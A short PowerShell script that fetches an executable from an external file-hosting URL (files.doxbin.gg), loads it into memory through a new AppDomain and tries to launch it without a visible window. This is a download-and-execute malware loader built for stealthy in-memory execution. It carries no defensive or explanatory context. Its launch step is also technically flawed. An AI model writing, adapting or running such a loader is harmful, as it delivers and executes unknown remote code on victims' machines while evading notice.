$url = "https://files.doxbin.gg/28ODr8dm.exe"

$executableBytes = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

if ($executableBytes) {
    $appDomain = [System.AppDomain]::CreateDomain("InMemoryDomain")
    $assembly = $appDomain.Load($executableBytes)

    # Start the executable without creating a new window
    Start-Process -FilePath $assembly.EntryPoint.Module.FullyQualifiedName -NoNewWindow

    [System.AppDomain]::Unload($appDomain)
} else {
    Write-Host "Download failed."
}
